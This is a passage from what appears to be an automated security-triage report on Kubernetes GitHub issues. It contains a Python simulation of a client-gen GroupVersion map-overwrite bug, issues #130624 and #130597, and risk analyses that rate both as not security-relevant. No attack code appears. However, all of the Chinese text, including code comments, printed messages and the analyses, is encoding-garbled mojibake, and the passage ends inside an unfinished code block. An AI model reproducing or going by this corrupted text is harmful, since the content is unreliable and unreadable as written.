# ä»¥è¯´æ˜ä¸ºä»€ä¹ˆåŒ Group/Version çš„ä¸åŒèµ„æºä¼šè¢«è¦†ç›–ã€‚

import time
import threading

# æ¨¡æ‹Ÿ Go ä¸­çš„ types.GroupVersion ç»“æ„
class GroupVersion:
    def __init__(self, group, version):
        self.group = group
        self.version = version

    # ä¸ºäº†èƒ½åœ¨å­—å…¸ä¸­ä½œä¸º keyï¼Œéœ€è¦å®ç° __hash__ å’Œ __eq__
    def __hash__(self):
        return hash((self.group, self.version))

    def __eq__(self, other):
        if not isinstance(other, GroupVersion):
            return NotImplemented
        return (self.group, self.version) == (other.group, other.version)

    def __repr__(self):
        return f"GroupVersion(group='{self.group}', version='{self.version}')"

# æ¨¡æ‹Ÿ Go ä¸­çš„ GroupVersionPackages å‡½æ•°é€»è¾‘
def simulate_group_version_packages(groups_config):
    """
    æ¨¡æ‹Ÿ client-gen ä¸­ GroupVersionPackages å‡½æ•°çš„æ ¸å¿ƒé€»è¾‘ã€‚

    Args:
        groups_config: ä¸€ä¸ªåˆ—è¡¨ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œä»£è¡¨ä¸€ä¸ª Group é…ç½®ï¼Œ
                       åŒ…å« 'Group' é”®å’Œ 'Versions' é”®ï¼ˆå…¶å€¼ä¸ºç‰ˆæœ¬å­—å…¸åˆ—è¡¨ï¼‰ã€‚
                       æ¯ä¸ªç‰ˆæœ¬å­—å…¸åŒ…å« 'Version' å’Œ 'Package' é”®ã€‚
                       ä¾‹å¦‚:
                       [
                           {
                               'Group': 'example.com',
                               'Versions': [
                                   {'Version': 'v1', 'Package': 'path/to/package1/v1'},
                                   {'Version': 'v2', 'Package': 'path/to/package1/v2'}
                               ]
                           },
                           {
                               'Group': 'example.com', # ä¸ä¸Šé¢ç›¸åŒçš„ Group
                               'Versions': [
                                   {'Version': 'v1', 'Package': 'path/to/package2/v1'} # ä¸ä¸Šé¢ç›¸åŒçš„ Version
                               ]
                           }
                       ]
    Returns:
        ä¸€ä¸ªå­—å…¸ï¼Œé”®æ˜¯ GroupVersion å¯¹è±¡ï¼Œå€¼æ˜¯åŒ…è·¯å¾„å­—ç¬¦ä¸²ã€‚
    """
    result_map = {}
    print("å¼€å§‹æ¨¡æ‹Ÿå¤„ç† Group/Version é…ç½®...")
    for pkg_group in groups_config:
        group_name = pkg_group.get('Group', '')
        versions = pkg_group.get('Versions', [])
        print(f"å¤„ç† Group: {group_name}")
        for version_info in versions:
            version_name = version_info.get('Version', '')
            package_path = version_info.get('Package', '')
            gv = GroupVersion(group=group_name, version=version_name)
            print(f"  å¤„ç† Version: {version_name}, Package: {package_path}")
            print(f"  å°è¯•å°† Key: {gv} (Hash: {hash(gv)}) å…³è”åˆ° Value: {package_path}")
            # æ ¸å¿ƒé€»è¾‘ï¼šå¦‚æœ key å·²å­˜åœ¨ï¼Œæ–°çš„å€¼ä¼šè¦†ç›–æ—§çš„å€¼
            result_map[gv] = package_path
            print(f"  å½“å‰ Map å†…å®¹: {result_map}")
            # çŸ­æš‚æš‚åœä»¥æ¨¡æ‹Ÿå¤„ç†è¿‡ç¨‹
            time.sleep(0.1)
    print("å¤„ç†å®Œæˆ.")
    return result_map

def main():
    # å®šä¹‰æ¨¡æ‹Ÿçš„è¾“å…¥é…ç½®ï¼ŒåŒ…å«ä¸¤ä¸ªä¸åŒçš„åŒ…è·¯å¾„ï¼Œä½†ä½¿ç”¨ç›¸åŒçš„ Group å’Œ Version
    mock_input_config = [
        {
            'Group': 'code-generator.k8s.io',
            'Versions': [
                {'Version': 'v1', 'Package': 'path/to/example/v1'}
            ]
        },
        {
            'Group': 'another.group.com', # ä¸åŒçš„ Group
            'Versions': [
                {'Version': 'v1', 'Package': 'path/to/another/v1'}
            ]
        },
        {
            'Group': 'code-generator.k8s.io', # ä¸ç¬¬ä¸€ä¸ªç›¸åŒçš„ Group
            'Versions': [
                {'Version': 'v1', 'Package': 'path/to/example2/v1'} # ä¸ç¬¬ä¸€ä¸ªç›¸åŒçš„ Versionï¼Œä½†åŒ…è·¯å¾„ä¸åŒ
            ]
        }
    ]

    print("æ¨¡æ‹Ÿ client-gen çš„ GroupVersionPackages å‡½æ•°è¡Œä¸º:")
    final_map = simulate_group_version_packages(mock_input_config)

    print("\næœ€ç»ˆç”Ÿæˆçš„ GroupVersion åˆ° Package çš„æ˜ å°„:")
    print(final_map)

    # éªŒè¯ç»“æœ
    expected_key = GroupVersion(group='code-generator.k8s.io', version='v1')
    expected_value_after_overwrite = 'path/to/example2/v1'

    if expected_key in final_map and final_map[expected_key] == expected_value_after_overwrite:
        print(f"\néªŒè¯æˆåŠŸï¼šKey {expected_key} æœ€ç»ˆæ˜ å°„åˆ°äº† '{expected_value_after_overwrite}'ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªåŒ…è·¯å¾„ 'path/to/example/v1' è¢«è¦†ç›–äº†ã€‚")
        # æŸ¥æ‰¾æ˜¯å¦è¿˜å­˜åœ¨å¦ä¸€ä¸ª Group çš„æ˜ å°„
        other_key = GroupVersion(group='another.group.com', version='v1')
        if other_key in final_map and final_map[other_key] == 'path/to/another/v1':
             print(f"éªŒè¯æˆåŠŸï¼šKey {other_key} ä¾ç„¶å­˜åœ¨ï¼Œå…¶å€¼ä¸º '{final_map[other_key]}'")
        else:
             print(f"éªŒè¯å¤±è´¥ï¼šKey {other_key} æœªæŒ‰é¢„æœŸå­˜åœ¨äºæœ€ç»ˆæ˜ å°„ä¸­ã€‚")

    else:
        print(f"\néªŒè¯å¤±è´¥ï¼šKey {expected_key} çš„å€¼ä¸æ˜¯é¢„æœŸçš„ '{expected_value_after_overwrite}' æˆ– Key ä¸å­˜åœ¨ã€‚å½“å‰å€¼ä¸º: {final_map.get(expected_key)}")

# è®¾ç½®ä¸€ä¸ªç®€å•çš„è¶…æ—¶æœºåˆ¶
exit_event = threading.Event()
def run_main_with_timeout():
    main_thread = threading.Thread(target=main)
    main_thread.start()
    main_thread.join(timeout=120) # 120ç§’è¶…æ—¶
    if main_thread.is_alive():
        print("\né”™è¯¯ï¼šè„šæœ¬æ‰§è¡Œè¶…æ—¶ï¼ˆè¶…è¿‡120ç§’ï¼‰ï¼Œå¼ºåˆ¶é€€å‡ºã€‚")
        # åœ¨å®é™…åœºæ™¯ä¸­ï¼Œå¯èƒ½éœ€è¦æ›´å¼ºç¡¬çš„åœæ­¢æ–¹å¼ï¼Œä½†å¯¹äºæ­¤æ¨¡æ‹Ÿè„šæœ¬ï¼Œæ‰“å°ä¿¡æ¯å³å¯
        # æ³¨æ„ï¼šPython çº¿ç¨‹é€šå¸¸ä¸å®¹æ˜“è¢«å¼ºåˆ¶åœæ­¢ï¼Œè¿™é‡Œä»…ç¤ºæ„
        exit_event.set() # å¯ä»¥ç”¨äºé€šçŸ¥å­çº¿ç¨‹ï¼ˆå¦‚æœå­çº¿ç¨‹æ£€æŸ¥æ­¤äº‹ä»¶ï¼‰

# ç›´æ¥æ‰§è¡Œä¸»é€»è¾‘ï¼ˆæ ¹æ®è¦æ±‚ï¼Œä¸ä½¿ç”¨ if __name__ == "__main__":ï¼‰
run_main_with_timeout()
```


**è§£é‡Šè¯´æ˜ï¼š**

ä¸Šè¿° Python è„šæœ¬å¹¶éç›´æ¥è¿è¡Œ `client-gen` æˆ–ä¸å…¶äº¤äº’ï¼Œè€Œæ˜¯æ¨¡æ‹Ÿäº† Issue ä¸­æŒ‡å‡ºçš„ Go ä»£ç  (`GroupVersionPackages` å‡½æ•°) çš„æ ¸å¿ƒé€»è¾‘ç¼ºé™·ã€‚

1.  **`GroupVersion` ç±»**: æ¨¡æ‹Ÿ Go ä»£ç ä¸­çš„ `types.GroupVersion` ç»“æ„ã€‚ä¸ºäº†èƒ½åœ¨ Python å­—å…¸ä¸­ä½œä¸º key ä½¿ç”¨ï¼Œå®ƒå®ç°äº† `__hash__` å’Œ `__eq__` æ–¹æ³•ï¼Œç¡®ä¿å…·æœ‰ç›¸åŒ `group` å’Œ `version` å±æ€§çš„å¯¹è±¡è¢«è§†ä¸ºç›¸ç­‰ä¸”å…·æœ‰ç›¸åŒçš„å“ˆå¸Œå€¼ã€‚
2.  **`simulate_group_version_packages` å‡½æ•°**: è¿™ä¸ªå‡½æ•°æ¥å—ä¸€ä¸ªç±»ä¼¼ `client-gen` è¾“å…¥å‚æ•°çš„ç»“æ„ (`groups_config`)ã€‚å®ƒéå†è¿™ä¸ªç»“æ„ï¼Œä¸ºæ¯ä¸ª Group å’Œ Version åˆ›å»ºä¸€ä¸ª `GroupVersion` å¯¹è±¡ä½œä¸º keyï¼Œå¹¶å°†å¯¹åº”çš„åŒ…è·¯å¾„ (`Package`) ä½œä¸º value å­˜å…¥ä¸€ä¸ª Python å­—å…¸ (`result_map`)ã€‚å…³é”®åœ¨äºï¼Œå½“é‡åˆ°ä¸€ä¸ªå·²ç»å­˜åœ¨äºå­—å…¸ä¸­çš„ `GroupVersion` key æ—¶ï¼ŒPython å­—å…¸çš„è¡Œä¸ºï¼ˆä¸ Go map ç±»ä¼¼ï¼‰æ˜¯ç”¨æ–°çš„ value è¦†ç›–æ—§çš„ valueã€‚å‡½æ•°é€šè¿‡æ‰“å°ä¸­é—´æ­¥éª¤å±•ç¤ºäº†è¿™ä¸ªè¦†ç›–è¿‡ç¨‹ã€‚
3.  **`main` å‡½æ•°**: è®¾ç½®äº†ä¸€ä¸ªåŒ…å«å†²çªé…ç½®çš„ `mock_input_config`ã€‚è¿™ä¸ªé…ç½®å®šä¹‰äº†ä¸¤ä¸ªèµ„æºï¼Œå®ƒä»¬å…±äº«ç›¸åŒçš„ Group (`code-generator.k8s.io`) å’Œ Version (`v1`)ï¼Œä½†æ¥è‡ªä¸åŒçš„æ¨¡æ‹ŸåŒ…è·¯å¾„ (`path/to/example/v1` å’Œ `path/to/example2/v1`)ã€‚è¿˜åŠ å…¥äº†ä¸€ä¸ªä¸åŒ Group çš„é…ç½®ä»¥éªŒè¯éå†²çªé¡¹ä¸å—å½±å“ã€‚ç„¶åè°ƒç”¨ `simulate_group_version_packages` å‡½æ•°å¤„ç†è¿™ä¸ªé…ç½®ï¼Œå¹¶æ‰“å°æœ€ç»ˆçš„ `result_map`ã€‚
4.  **éªŒè¯**: æ£€æŸ¥æœ€ç»ˆçš„ `result_map` æ˜¯å¦å¦‚é¢„æœŸé‚£æ ·ï¼ŒåªåŒ…å«äº† `code-generator.k8s.io/v1` çš„æœ€åä¸€ä¸ªåŒ…è·¯å¾„ (`path/to/example2/v1`)ï¼Œä»è€Œè¯æ˜äº†è¦†ç›–è¡Œä¸ºçš„å‘ç”Ÿã€‚åŒæ—¶éªŒè¯äº†éå†²çªçš„ `another.group.com/v1` æ¡ç›®ä¾ç„¶å­˜åœ¨ã€‚
5.  **è¶…æ—¶æœºåˆ¶**: ä½¿ç”¨ `threading` æ¨¡å—å®ç°äº†ä¸€ä¸ªç®€å•çš„è¶…æ—¶æ§åˆ¶ (`run_main_with_timeout` å‡½æ•°)ï¼Œç¡®ä¿è„šæœ¬åœ¨2åˆ†é’Ÿå†…å®Œæˆæ‰§è¡Œæˆ–æŠ¥å‘Šè¶…æ—¶ã€‚

è¿™ä¸ªè„šæœ¬çš„ç›®çš„æ˜¯åœ¨ Python ç¯å¢ƒä¸­æ¸…æ™°åœ°å±•ç¤ºå¯¼è‡´ Issue ä¸­æ‰€è¿°é—®é¢˜çš„æ ¹æœ¬åŸå› â€”â€”å³ä½¿ç”¨ Group/Version ä½œä¸ºå”¯ä¸€ key æ—¶ï¼Œç›¸åŒ key çš„åç»­æ¡ç›®ä¼šè¦†ç›–å…ˆå‰æ¡ç›®ï¼Œä»è€Œå¯¼è‡´ä¿¡æ¯ä¸¢å¤±ã€‚å®ƒå¹¶ä¸å®é™…æ‰§è¡Œä»£ç ç”Ÿæˆï¼Œå› æ­¤ä¸æ„æˆå®‰å…¨é£é™©ï¼Œä¸”ä»…ç”¨äºç†è§£å’Œæ¼”ç¤ºè¯¥é€»è¾‘ç¼ºé™·ã€‚ç”±äºåŸå§‹é—®é¢˜æ˜¯åŠŸèƒ½æ€§è€Œéå®‰å…¨æ€§çš„ï¼Œä¸”å‘ç”Ÿåœ¨å¼€å‘å·¥å…·å†…éƒ¨ï¼Œå› æ­¤é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

---


## Issue #130624 Remove unit tests in volume_linux.go that needs to be ran as root

- Issue é“¾æ¥ï¼š[#130624](https://github.com/kubernetes/kubernetes/issues/130624)

### Issue å†…å®¹

#### What happened?

Now that, we have full e2e coverage of fsgroup feature - we can remove the unit tests that require root permissions to run.

But this needs to be done carefully. Without root permissions, none of the code that exercises `chown` can run and hence unit tests can't verify if ownership of files have changed. But at the same time, removing that guarantee can make some of the unit tests kinda pass even if unit tests themselves are buggy.


#### What did you expect to happen?

volume_linux.go tests shouldn't require root permissions to run.

#### How can we reproduce it (as minimally and precisely as possible)?

Run unit tests

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue çš„æ ¸å¿ƒå†…å®¹æ˜¯å»ºè®®ç§»é™¤ `volume_linux.go` æ–‡ä»¶ä¸­éœ€è¦ root æƒé™æ‰èƒ½è¿è¡Œçš„å•å…ƒæµ‹è¯•ã€‚ç†ç”±æ˜¯ç°åœ¨å·²ç»æœ‰äº†ç«¯åˆ°ç«¯ï¼ˆe2eï¼‰æµ‹è¯•è¦†ç›–äº† `fsgroup` ç‰¹æ€§ï¼Œè¿™äº›éœ€è¦ root çš„å•å…ƒæµ‹è¯•å˜å¾—å†—ä½™ã€‚Issue è¿˜æåˆ°äº†ç§»é™¤è¿™äº›æµ‹è¯•éœ€è¦å°å¿ƒï¼Œå› ä¸ºæ²¡æœ‰ root æƒé™ï¼Œä¾èµ– `chown` çš„ä»£ç è·¯å¾„å°†æ— æ³•åœ¨å•å…ƒæµ‹è¯•ä¸­ç›´æ¥éªŒè¯æ–‡ä»¶æ‰€æœ‰æƒå˜æ›´ï¼Œéœ€è¦ç¡®ä¿ç§»é™¤æµ‹è¯•ä¸ä¼šæ„å¤–åœ°å¯¼è‡´æ½œåœ¨çš„ bug è¢«å¿½ç•¥ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1.  è¯¥ Issue è®¨è®ºçš„æ˜¯å•å…ƒæµ‹è¯•çš„ç»´æŠ¤å’Œä¼˜åŒ–é—®é¢˜ï¼Œç›®æ ‡æ˜¯ç§»é™¤éœ€è¦ç‰¹æƒæƒé™çš„æµ‹è¯•ï¼Œä»¥ä¾¿åœ¨æ™®é€šç”¨æˆ·ç¯å¢ƒä¸‹è¿è¡Œæµ‹è¯•å¥—ä»¶ã€‚
2.  å®ƒæè¿°çš„æ˜¯å¼€å‘å’Œæµ‹è¯•æµç¨‹ä¸­çš„ä¸€ä¸ªæ”¹è¿›ç‚¹ï¼Œè€Œä¸æ˜¯è½¯ä»¶æœ¬èº«åœ¨è¿è¡Œæ—¶çš„å®‰å…¨æ¼æ´ã€‚å•å…ƒæµ‹è¯•é€šå¸¸åœ¨å¼€å‘æˆ– CI ç¯å¢ƒä¸­è¿è¡Œï¼Œä¸ç”Ÿäº§ç¯å¢ƒçš„å®é™…è¿è¡Œé€»è¾‘å’Œé¢ä¸´çš„å¨èƒä¸åŒã€‚
3.  Issue ä¸­æ²¡æœ‰æåŠä»»ä½•ç”¨æˆ·è¾“å…¥ã€å¤–éƒ¨äº¤äº’æˆ–é…ç½®ä¼šå¯¼è‡´å®‰å…¨é£é™©ï¼ˆå¦‚å‘½ä»¤æ³¨å…¥ã€è·¯å¾„éå†ã€æƒé™æå‡ç­‰ï¼‰ã€‚
4.  ç§»é™¤éœ€è¦ root çš„æµ‹è¯•æœ¬èº«æ˜¯ä¸ºäº†é™ä½æµ‹è¯•ç¯å¢ƒçš„é£é™©å’Œå¤æ‚æ€§ï¼Œè€Œä¸æ˜¯å¼•å…¥æ–°çš„é£é™©ã€‚è™½ç„¶ Issue æåˆ°äº†ç§»é™¤æµ‹è¯•å¯èƒ½å¸¦æ¥çš„éªŒè¯ç¼ºå¤±é£é™©ï¼Œä½†è¿™å±äºæµ‹è¯•è¦†ç›–åº¦çš„é—®é¢˜ï¼Œè€Œéç›´æ¥çš„å®‰å…¨æ¼æ´ã€‚
5.  æ ¹æ®æ ‡å‡†ç¬¬ 2 æ¡ï¼Œè¯¥ issue æè¿°çš„é—®é¢˜éå®‰å…¨é—®é¢˜ã€‚

å› æ­¤ï¼Œè¯¥ Issue ä¸æ¶‰åŠè½¯ä»¶æœ¬èº«çš„å®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# Issue åˆ†æç»“è®ºä¸ºâ€œä¸æ¶‰åŠâ€å®‰å…¨é£é™©ï¼Œæ— éœ€å¤ç°è„šæœ¬ã€‚
# è¯¥ Issue è®¨è®ºçš„æ˜¯ä»£ç åº“ä¸­å•å…ƒæµ‹è¯•çš„ç»´æŠ¤é—®é¢˜ï¼Œ
# å…·ä½“æ“ä½œæ˜¯åœ¨ä»£ç åº“ä¸­ç§»é™¤æˆ–ä¿®æ”¹ç‰¹å®šçš„å•å…ƒæµ‹è¯•å‡½æ•°ï¼Œ
# è¿™ä¸æ„æˆä¸€ä¸ªå¯ä»¥é€šè¿‡å¤–éƒ¨äº¤äº’å¤ç°çš„å®‰å…¨æ¼æ´ã€‚
def main():
    print("è¯¥ Issue ä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œæ— éœ€ POC è„šæœ¬ã€‚")
    print("Issue å†…å®¹å…³æ³¨äºç§»é™¤éœ€è¦ root æƒé™çš„å•å…ƒæµ‹è¯•ï¼Œå±äºè½¯ä»¶å¼€å‘å’Œæµ‹è¯•æµç¨‹ä¼˜åŒ–ã€‚")

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Issue è®¨è®ºçš„æ˜¯ Kubernetes ä»£ç åº“ä¸­ `volume_linux.go` æ–‡ä»¶å†…å•å…ƒæµ‹è¯•çš„æ”¹è¿›å»ºè®®ã€‚å…·ä½“æ¥è¯´ï¼Œå»ºè®®ç§»é™¤é‚£äº›éœ€è¦ root æƒé™æ‰èƒ½æ‰§è¡Œçš„æµ‹è¯•ç”¨ä¾‹ï¼Œå› ä¸ºç›¸å…³åŠŸèƒ½ï¼ˆ`fsgroup`ï¼‰å·²æœ‰ç«¯åˆ°ç«¯æµ‹è¯•è¦†ç›–ã€‚è¿™æ˜¯ä¸€ä¸ªå…³äºæµ‹è¯•ç­–ç•¥å’Œä»£ç ç»´æŠ¤çš„è®¨è®ºï¼Œç›®çš„æ˜¯è®©å•å…ƒæµ‹è¯•æ›´å®¹æ˜“åœ¨æ²¡æœ‰ç‰¹æ®Šæƒé™çš„ç¯å¢ƒä¸‹è¿è¡Œã€‚Issue æœ¬èº«å¹¶æœªæè¿°è½¯ä»¶ä¸­å­˜åœ¨çš„ã€å¯è¢«åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚å› æ­¤ï¼Œé£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ï¼Œä¸éœ€è¦æä¾›å¤ç°å®‰å…¨æ¼æ´çš„ POC è„šæœ¬ã€‚æä¾›çš„ python è„šæœ¬ä»…ä½œä¸ºå ä½ç¬¦ï¼Œè¯´æ˜äº†æ— éœ€ POC çš„åŸå› ã€‚

---


## Issue #130597 VolumeAttributesClass update should support recover from failure

- Issue é“¾æ¥ï¼š[#130597](https://github.com/kubernetes/kubernetes/issues/130597)

### Issue å†…å®¹

#### What happened?

- When setting a VolumeAttributesClass (VAC) name in PVC for the first time, currently there isn't a way for the user to go back to unsetting VAC name even if it keeps failing and there is no way of setting VAC name successfully on the storage backend.
- When changing a VAC name from A->B, currently there isn't a way for the user to go back to VAC A if it keeps failing and there is no way of changing from A->B successfully on the storage backend.

#### What did you expect to happen?

- When setting a VolumeAttributesClass (VAC) name in PVC for the first time, there should be a way for the user to roll back (unset the VAC name) if it keeps failing and if there is no way of setting the VAC name successfully on the storage backend.
- When changing a VAC name from A->B, there should be a way for the user to roll back (change VAC name back to A) if it keeps failing and if there is no way of changing from A->B successfully on the storage backend.

#### How can we reproduce it (as minimally and precisely as possible)?

- Try to set VAC name in PVC for the first time but providing a VAC that is infeasible to set on the storage backend so it will never be successful.
- Try to change a VAC name from A->B but B is an infeasible option for the storage backend so it will never be successful.

#### Anything else we need to know?

If CSI driver returns an error code that indicates CSI ModifyVolume is infeasible, we should allow the user to roll back the VAC change in PVC.

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
</details>
Kubernetes 1.32

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **é—®é¢˜æè¿°**: Issue æè¿°äº†åœ¨ Kubernetes ä¸­æ›´æ–° PersistentVolumeClaim (PVC) çš„ `VolumeAttributesClass` (VAC) æ—¶é‡åˆ°çš„ä¸€ä¸ªåŠŸèƒ½æ€§é—®é¢˜ã€‚å½“ç”¨æˆ·é¦–æ¬¡è®¾ç½® VAC æˆ–æ›´æ”¹ç°æœ‰ VAC æ—¶ï¼Œå¦‚æœåç«¯å­˜å‚¨ç³»ç»Ÿ (é€šè¿‡ CSI é©±åŠ¨) æ— æ³•æˆåŠŸåº”ç”¨è¯¥ VAC (ä¾‹å¦‚ï¼ŒVAC æ— æ•ˆæˆ–ä¸è¢«æ”¯æŒ)ï¼Œç”¨æˆ·ç›®å‰æ— æ³•æ’¤é”€æˆ–å›æ»š PVC spec ä¸­çš„è¿™ä¸ªæ›´æ”¹ã€‚PVC ä¼šå¡åœ¨å°è¯•åº”ç”¨å¤±è´¥çŠ¶æ€çš„ VACã€‚
2.  **å½±å“**: è¿™ä¸ªé—®é¢˜çš„ç›´æ¥å½±å“æ˜¯ç”¨æˆ·å¯èƒ½æ— æ³•ä½¿ç”¨æˆ–ä¿®æ”¹å—å½±å“çš„ PVCï¼Œå› ä¸ºå®ƒå¤„äºä¸€ä¸ªé”™è¯¯çš„ã€æ— æ³•è‡ªåŠ¨æ¢å¤çš„é…ç½®çŠ¶æ€ã€‚è¿™ä¼šå¯¼è‡´ä¾èµ–è¯¥ PVC çš„ Pod æ— æ³•æ­£å¸¸æŒ‚è½½å·ï¼Œä»è€Œå½±å“åº”ç”¨çš„å¯ç”¨æ€§ã€‚
3.  **å®‰å…¨é£é™©è¯„ä¼°**:
    *   **æœºå¯†æ€§/å®Œæ•´æ€§/å¯ç”¨æ€§**: è¯¥é—®é¢˜ä¸»è¦å½±å“**å¯ç”¨æ€§**ã€‚ç”¨æˆ·è‡ªå·±çš„ PVC å¯èƒ½å˜å¾—ä¸å¯ç”¨ã€‚å®ƒä¸æ¶‰åŠæœªç»æˆæƒçš„æ•°æ®è®¿é—® (æœºå¯†æ€§) æˆ–æ•°æ®ç¯¡æ”¹ (å®Œæ•´æ€§)ã€‚
    *   **æ”»å‡»è€…åˆ©ç”¨**: æ½œåœ¨çš„æ”»å‡»è€…éœ€è¦æ‹¥æœ‰ä¿®æ”¹ç›®æ ‡ PVC çš„æƒé™ (é€šå¸¸æ˜¯ namespace å†…çš„ `edit` æˆ–æ›´é«˜æƒé™)ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ•…æ„è®¾ç½®ä¸€ä¸ªæ— æ•ˆçš„ VAC æ¥ä½¿æŸä¸ª PVC ä¸å¯ç”¨ã€‚
    *   **æ‹’ç»æœåŠ¡ (DoS)**: è¿™å¯ä»¥è¢«è§†ä¸ºä¸€ç§é’ˆå¯¹ç‰¹å®š PVC çš„æ‹’ç»æœåŠ¡ã€‚ç„¶è€Œï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬ 5 æ¡ï¼Œè¿™ç§ DoS éœ€è¦æ”»å‡»è€…å…·å¤‡ä¿®æ”¹ PVC çš„æƒé™ï¼Œè¿™ç§æƒé™æœ¬èº«å°±å…è®¸å¯¹èµ„æºè¿›è¡Œç ´åæ€§æ“ä½œï¼ˆä¾‹å¦‚åˆ é™¤ PVCï¼‰ã€‚å› æ­¤ï¼Œåˆ©ç”¨æ­¤é—®é¢˜è¿›è¡Œ DoS æ”»å‡»ï¼Œå…¶å‰ææƒé™è¦æ±‚è¾ƒé«˜ï¼Œä¸”å½±å“èŒƒå›´ç›¸å¯¹æœ‰é™ï¼ˆé’ˆå¯¹ç‰¹å®š PVCï¼‰ã€‚å®ƒå¹¶ä¸æ¯”æ‹¥æœ‰è¯¥æƒé™çš„æ”»å‡»è€…ç›´æ¥åˆ é™¤ PVC æˆ–ç›¸å…³ Pod é€ æˆçš„ç ´åæ›´å¤§ã€‚
    *   **æƒé™æå‡/å‘½ä»¤æ‰§è¡Œ/ä¿¡æ¯æ³„éœ²**: è¯¥é—®é¢˜ä¸æ¶‰åŠä»»ä½•æƒé™æå‡ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸æˆ–æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚
    *   **å¤šç§Ÿæˆ·å½±å“**: è¯¥é—®é¢˜é€šå¸¸å½±å“çš„æ˜¯è¿›è¡Œæ“ä½œçš„ç”¨æˆ·è‡ªå·±çš„ PVCã€‚è™½ç„¶åº•å±‚å­˜å‚¨å¯èƒ½æ˜¯å…±äº«çš„ï¼Œä½†å°†ä¸€ä¸ª PVC é…ç½®ä¸ºæ— æ•ˆ VAC é€šå¸¸ä¸ä¼šç›´æ¥å½±å“åˆ°å…¶ä»–ç§Ÿæˆ·/ç”¨æˆ·çš„ PVCï¼ˆé™¤é CSI é©±åŠ¨å®ç°æœ‰ç¼ºé™·ï¼Œä½†è¿™è¶…å‡ºäº†è¯¥ Issue æœ¬èº«çš„èŒƒç•´ï¼‰ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬ 8 æ¡ï¼Œæ²¡æœ‰è¿¹è±¡è¡¨æ˜ä½æƒé™ç”¨æˆ·å¯ä»¥å½±å“å…¶ä»–ç”¨æˆ·ã€‚
    *   **CVSS è¯„åˆ†**: å¦‚æœå¼ºè¡Œè§†ä¸ºä¸€ä¸ªå¯ç”¨æ€§æ¼æ´ï¼Œç”±äºéœ€è¦è¾ƒé«˜æƒé™ï¼ˆä¿®æ”¹ PVCï¼‰ä¸”å½±å“èŒƒå›´æœ‰é™ï¼ˆå•ä¸ª PVCï¼‰ï¼Œå…¶ CVSS è¯„åˆ†ä¸å¤ªå¯èƒ½è¾¾åˆ° `High` (7.0+) çº§åˆ«ã€‚ä¾‹å¦‚ï¼ŒAV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:L (å¤§è‡´è¯„åˆ†ä¸º 2.x - 3.xï¼Œå±äº Low)ã€‚PR:H æ˜¯å› ä¸ºéœ€è¦ç‰¹å®šå¯¹è±¡ä¿®æ”¹æƒé™ã€‚
4.  **ç»“è®º**: è¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½ç¼ºé™·å’Œå¯é æ€§é—®é¢˜ï¼Œè€Œéå…¸å‹çš„å®‰å…¨æ¼æ´ã€‚å®ƒå¯èƒ½å¯¼è‡´ç‰¹å®šèµ„æºçš„å¯ç”¨æ€§é™ä½ï¼Œä½†åˆ©ç”¨æ¡ä»¶ï¼ˆéœ€è¦ä¿®æ”¹æƒé™ï¼‰å’Œå½±å“èŒƒå›´æœ‰é™ï¼Œä¸æ»¡è¶³é«˜é£é™©å®‰å…¨é—®é¢˜çš„æ ‡å‡†ã€‚æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œç‰¹åˆ«æ˜¯ç¬¬ 5 æ¡ï¼Œè¯¥é—®é¢˜åº”è¢«è¯„ä¸º "ä¸æ¶‰åŠ" æˆ– "ä½é£é™©"ã€‚è€ƒè™‘åˆ°å®ƒæœ¬è´¨ä¸Šæ˜¯é”™è¯¯é…ç½®å¯¼è‡´çš„åŠŸèƒ½é˜»å¡ï¼Œè€Œéåˆ©ç”¨ç³»ç»Ÿå¼±ç‚¹è·å–é¢å¤–æƒé™æˆ–é€ æˆå¹¿æ³›ç ´åï¼Œâ€œä¸æ¶‰åŠâ€ æ›´ä¸ºè´´åˆ‡ï¼Œå› ä¸ºå®ƒå…³æ³¨çš„æ˜¯ç³»ç»Ÿå¥å£®æ€§è€Œéå®‰å…¨è¾¹ç•Œã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
